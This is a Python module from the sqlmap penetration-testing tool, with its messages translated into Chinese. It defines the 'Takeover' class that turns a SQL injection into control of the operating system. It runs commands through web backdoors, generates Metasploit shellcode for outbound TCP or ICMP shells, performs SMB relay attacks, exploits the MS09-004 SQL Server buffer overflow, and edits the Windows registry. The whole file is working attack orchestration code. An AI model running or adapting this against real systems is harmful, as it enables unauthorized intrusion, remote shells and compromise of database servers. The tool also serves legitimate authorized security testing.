#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import getSafeExString
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import openFile
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = ("%soutput" % conf.tablePrefix)
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "正在使用web后门执行命令"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过后端DBMS执行操作系统命令"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "将使用Web后门打开命令提示符"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过后端DBMS打开交互式操作系统shell，因为堆叠查询SQL注入不受支持"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()

        try:
            self.initEnv(web=web)
        except SqlmapFilePathException:
            if not web and not conf.direct:
                infoMsg = "回退到web后门方法..."
                logger.info(infoMsg)

                web = True
                kb.udfFail = True

                self.initEnv(web=web)
            else:
                raise

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = "您想如何建立隧道?"
            msg += "\n[1] TCP: Metasploit Framework (default)"
            msg += "\n[2] ICMP: icmpsh - ICMP隧道"

            while True:
                tunnel = readInput(msg, default='1')

                if isDigit(tunnel) and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "无效的值，有效值为'1'和'2'"
                    logger.warning(warnMsg)
        else:
            tunnel = 1

            debugMsg = "只有当后端DBMS不是Windows时，隧道才能通过TCP建立"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = "您需要以管理员权限运行sqlmap，以建立出站ICMP隧道嗅探和创建ICMP数据包"
                raise SqlmapMissingPrivileges(errMsg)

            try:
                __import__("impacket")
            except ImportError:
                errMsg = "sqlmap需要'python-impacket'第三方库来运行icmpsh主机。"
                raise SqlmapMissingDependence(errMsg)

            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(filename):
                try:
                    with openFile(filename, "wb") as f:
                        f.write("1")
                except IOError as ex:
                    errMsg += "文件打开/写入错误，文件名 '%s' ('%s')" % (filename, getSafeExString(ex))
                    raise SqlmapSystemException(errMsg)
            else:
                errMsg = "您需要通过您的机器系统禁用ICMP回复，例如，在Linux/Unix上运行：\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += "如果您忘记这样做,您将接收来自数据库服务器的信息,但不太可能接收到您发送的命令"
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = "您希望如何在后端数据库底层操作系统上执行Metasploit shellcode？"
                    msg += "\n[1] 通过UDF 'sys_bineval'(内存方式,反取证, default)"
                    msg += "\n[2] 通过'shellcodeexec'(文件系统方式,64位系统上首选)"

                    while True:
                        choice = readInput(msg, default='1')

                        if isDigit(choice) and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "无效的值，有效值为'1'和'2'"
                            logger.warning(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = "无法建立操作系统takeover"
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = "默认情况下，Windows上的MySQL运行为SYSTEM用户，无需特权升级"
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = "无法建立操作系统takeover"
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = "回退到web后门方法"
            else:
                infoMsg = "使用web后门方法"
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg = "sqlmap不支持当后端DBMS底层系统不是Windows时进行操作系统用户特权升级技术"
                    logger.warning(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = "无法建立操作系统takeover"
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = "无法建立操作系统takeover"
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "无法提示出站外壳会话"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统不是Windows，无法执行SMB中继攻击"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = "在这种后端DBMS中，只有当堆叠查询支持时，才能执行SMB中继攻击"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "由于堆叠查询不支持，sqlmap将通过盲注入执行SMB中继攻击"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "这项攻击不太可能成功"

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += "，因为默认情况下，Windows上的MySQL运行为Local System，它不是一个真实用户，不会在连接到SMB服务时发送NTLM会话哈希"


        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += "，因为默认情况下，Windows上的PostgreSQL运行为postgres用户，它是一个系统真实用户，但不是Administrators组的成员"

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += ",因为通常Microsoft SQL Server %s 运行为Network Service，它不是一个真实用户，不会在连接到SMB服务时发送NTLM会话哈希" % Backend.getVersion()


        else:
            printWarn = False

        if printWarn:
            logger.warning(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = "后端DBMS必须是Microsoft SQL Server 2000或2005才能利用'sp_replwritetovarbin'存储过程(MS09-004)中的基于堆的缓冲区溢出漏洞"
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = "将利用Microsoft SQL Server %s " % Backend.getVersion()
        infoMsg += "'sp_replwritetovarbin'存储过程的基于堆的缓冲区溢出漏洞(MS09-004)"
        logger.info(infoMsg)

        msg = "此技术可能会导致DBMS进程停止响应,您确定要执行此漏洞利用吗？[y/N] "

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "'uncPathRequest'方法必须在特定的DBMS插件中定义"
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统不是Windows"
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = "您要读取哪个注册表键？[%s] " % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = "您要读取哪个注册表键值？[%s] " % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "正在读取Windows注册表路径'%s\\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = "缺少必填选项"

        if not conf.regKey:
            msg = "您要写入哪个注册表键？"
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "您要写入哪个注册表键值？"
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = "您要写入哪个注册表键值数据？"
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = "该注册表键值的数据类型是什么？"
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "正在添加Windows注册表路径'%s\\%s' " % (regKey, regVal)
        infoMsg += "数据为'%s'。 " % regData
        infoMsg += "只有运行数据库进程的用户具有修改Windows注册表的权限时,此操作才能成功。"
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = "缺少必填选项"

        if not conf.regKey:
            msg = "您要删除哪个注册表键？"
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "您要删除哪个注册表键值？"
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = "您确定要删除Windows注册表路径'%s\\%s'吗？[y/N] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "正在删除Windows注册表路径'%s\\%s'。 " % (regKey, regVal)
        infoMsg += "只有运行数据库进程的用户具有修改Windows注册表的权限时,此操作才能成功。"
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
